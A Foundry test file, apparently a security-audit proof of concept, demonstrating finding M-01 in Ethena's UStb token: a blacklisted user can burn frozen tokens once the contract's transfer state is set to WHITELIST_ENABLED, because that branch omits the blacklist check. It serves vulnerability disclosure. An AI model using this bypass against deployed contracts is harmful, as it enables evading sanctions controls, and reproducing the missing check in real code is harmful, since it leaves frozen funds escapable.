// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {UStb} from "../contracts/ustb/UStb.sol";
import {IUStbDefinitions} from "../contracts/ustb/IUStbDefinitions.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol"; 

/// @title M-01: Blacklisted users can bypass frozen state by abusing burn()
/// @notice A blacklisted user can bypass the freeze mechanism when transferState == WHITELIST_ENABLED.
/// The burn() function omits the !hasRole(BLACKLISTED_ROLE) check in this state, allowing the user to destroy their frozen balance.
/// @author 0xSchutze
contract Ethena_M01_PoC is Test {
    UStb public ustb;
    
    address public admin = makeAddr("admin");
    address public alice = makeAddr("alice"); 
    address public minter = makeAddr("minter");

    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;
    bytes32 public constant MINTER_CONTRACT = keccak256("MINTER_CONTRACT");
    bytes32 public constant WHITELISTED_ROLE = keccak256("WHITELISTED_ROLE");
    bytes32 public constant BLACKLISTED_ROLE = keccak256("BLACKLISTED_ROLE");

    uint256 public constant ALICE_BALANCE = 1000e18;

    function setUp() public {
        UStb implementation = new UStb();

        bytes memory initData = abi.encodeWithSelector(UStb.initialize.selector, admin, minter);                                                                                                                                              
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), initData);   
        ustb = UStb(address(proxy));

        vm.startPrank(admin);
        ustb.grantRole(WHITELISTED_ROLE, alice);
        vm.stopPrank();

        vm.startPrank(minter);
        ustb.mint(alice, ALICE_BALANCE);
        vm.stopPrank();
    }

    /// @notice Proves that a blacklisted user can successfully call burn() and destroy frozen funds.
    function test_M01_BlacklistBypass() public {
        // Admin blacklists Alice, freezing her funds.
        vm.prank(admin);
        ustb.grantRole(BLACKLISTED_ROLE, alice);  

        // Confirm blacklist is enforced under FULLY_ENABLED state.
        vm.prank(alice);
        vm.expectRevert(IUStbDefinitions.OperationNotAllowed.selector);
        ustb.burn(ALICE_BALANCE);
        
        // Admin applies protocol-wide whitelist restriction.
        vm.prank(admin);
        ustb.updateTransferState(IUStbDefinitions.TransferState.WHITELIST_ENABLED);

        // The WHITELIST_ENABLED branch in _beforeTokenTransfer omits the blacklist check for burn().
        // Therefore, Alice can destroy her frozen tokens, causing permanent asset loss.
        vm.prank(alice);
        ustb.burn(ALICE_BALANCE);
        
        uint256 balanceAfter = ustb.balanceOf(alice);
        assertEq(balanceAfter, 0, "balance must be zero: burn succeeded despite blacklist");
    }
}
